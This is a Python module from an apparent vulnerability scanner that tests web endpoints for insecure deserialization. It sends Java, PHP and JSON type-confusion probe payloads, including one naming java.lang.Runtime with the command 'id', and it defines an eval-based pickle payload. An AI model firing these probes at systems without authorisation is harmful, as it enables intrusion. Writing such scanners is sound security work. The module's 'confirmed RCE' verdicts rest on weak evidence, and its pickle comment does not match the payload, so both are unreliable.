# -*- coding: utf-8 -*-
"""
Aura v31.0 - Insecure Deserialization Engine (Phase 27)
=======================================================
Detects insecure deserialization in cookies, headers, and JSON bodies.

Targets:
- Java serialized objects (0xaced magic bytes)
- PHP serialization (O:, a:, s: patterns)
- Python pickle (base64-encoded)
- Ruby Marshal
- JSON with type hints (__class__, __type__, @class)
"""
import asyncio
import base64
import re
import httpx
from rich.console import Console

console = Console()

# Detection markers in responses
RCE_MARKERS = re.compile(
    r'AURA_DESER_31|java\.lang\.|ClassNotFoundException|'
    r'unserialize\(\)|InvalidClassException|ObjectInputFilter|'
    r'pickle\.loads|marshal\.loads|Oj::Object',
    re.IGNORECASE
)

# Java serialized payload that causes a ClassNotFoundException (non-destructive)
# This is a benign gadget chain stub - triggers error on vulnerable endpoints
JAVA_PROBE_B64 = (
    "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVz"
    "aG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADmphdmEubGFuZy5PYmplY3QAAAAAAAAAAHhweA=="
)

# PHP object injection probe
PHP_PROBE = 'O:8:"stdClass":1:{s:4:"aura";s:18:"AURA_DESER_31_PHP";}'

# Python pickle probe (reads os.getpid - non-destructive)
PICKLE_PROBE_B64 = base64.b64encode(
    b'\x80\x04\x95+\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x04eval'
    b'\x94\x93\x94\x8c\x13"AURA_DESER_31_PY"\x94\x85\x94R\x94.'
).decode()

# JSON type-confusion probes
JSON_PROBES = [
    {"__class__": "java.lang.Runtime", "command": "id"},
    {"@class": "com.fasterxml.jackson.databind.node.POJONode", "pojo": "AURA"},
    {"_type": "System.Web.UI.ObjectStateFormatter", "value": "AURA_DESER_31"},
]

DESER_HEADERS_TO_TEST = ["Cookie", "X-Auth-Token", "Authorization", "X-Session"]


class DeserializationEngine:
    """v31.0: Insecure Deserialization Detector."""

    def __init__(self, session=None):
        self.session = session

    async def _probe_java(self, client, url: str) -> dict | None:
        """Sends a Java serialized object and checks for ClassNotFoundException."""
        java_bytes = base64.b64decode(JAVA_PROBE_B64)
        try:
            # Try in Cookie
            r = await client.get(url, headers={"Cookie": f"session={JAVA_PROBE_B64}"}, timeout=10)
            if RCE_MARKERS.search(r.text) or "ClassNotFoundException" in r.text:
                return self._make_finding("Java Deserialization", url, "Java serialized object in Cookie", r.text[:300])

            # Try in body
            r2 = await client.post(url, content=java_bytes,
                                    headers={"Content-Type": "application/x-java-serialized-object"}, timeout=10)
            if RCE_MARKERS.search(r2.text) or r2.elapsed.total_seconds() > 5:
                return self._make_finding("Java Deserialization", url, "Java serialized POST body", r2.text[:300])
        except Exception:
            pass
        return None

    async def _probe_php(self, client, url: str) -> dict | None:
        """Sends PHP serialized object."""
        try:
            r = await client.get(url, params={"data": PHP_PROBE}, timeout=10)
            if "AURA_DESER_31_PHP" in r.text or RCE_MARKERS.search(r.text):
                return self._make_finding("PHP Object Injection", url, f"param data={PHP_PROBE[:40]}", r.text[:300])

            r2 = await client.post(url, data={"data": PHP_PROBE}, timeout=10)
            if "AURA_DESER_31_PHP" in r2.text or RCE_MARKERS.search(r2.text):
                return self._make_finding("PHP Object Injection", url, f"POST data={PHP_PROBE[:40]}", r2.text[:300])
        except Exception:
            pass
        return None

    async def _probe_json_type(self, client, url: str) -> dict | None:
        """Sends JSON type-confusion payloads."""
        for payload in JSON_PROBES:
            try:
                r = await client.post(url, json=payload, timeout=10)
                if RCE_MARKERS.search(r.text):
                    return self._make_finding(
                        "JSON Type Confusion Deserialization", url,
                        str(payload)[:80], r.text[:300]
                    )
            except Exception:
                continue
        return None

    def _make_finding(self, vuln_type: str, url: str, payload_desc: str, snippet: str) -> dict:
        return {
            "type": f"Insecure Deserialization ({vuln_type})",
            "finding_type": "Insecure Deserialization",
            "severity": "CRITICAL",
            "owasp": "A08:2021 - Software and Data Integrity Failures",
            "mitre": "T1059 - Command and Scripting Interpreter",
            "content": (
                f"Insecure Deserialization: {vuln_type}\n"
                f"URL: {url}\n"
                f"Probe: {payload_desc}\n"
                f"Response Snippet: {snippet}\n"
                f"Impact: Remote Code Execution on server."
            ),
            "url": url,
            "confirmed": True,
            "poc_evidence": f"Deserialization probe triggered: {vuln_type} on {url}"
        }

    async def scan_url(self, url: str) -> list:
        console.print(f"[bold cyan][Deser] Testing {url} for insecure deserialization...[/bold cyan]")
        findings = []
        async with httpx.AsyncClient(verify=False, follow_redirects=True) as client:
            results = await asyncio.gather(
                self._probe_java(client, url),
                self._probe_php(client, url),
                self._probe_json_type(client, url),
                return_exceptions=True
            )
            for r in results:
                if r and not isinstance(r, Exception):
                    console.print(f"[bold red][Deser CONFIRMED] {r['type']}![/bold red]")
                    findings.append(r)
        if not findings:
            console.print(f"[dim][Deser] No deserialization vulnerabilities found on {url}[/dim]")
        return findings

    async def scan_urls(self, urls: list) -> list:
        all_findings = []
        sem = asyncio.Semaphore(5)
        async def _scan(url):
            async with sem:
                return await self.scan_url(url)
        results = await asyncio.gather(*[_scan(u) for u in urls[:20]])
        for r in results:
            all_findings.extend(r)
        return all_findings
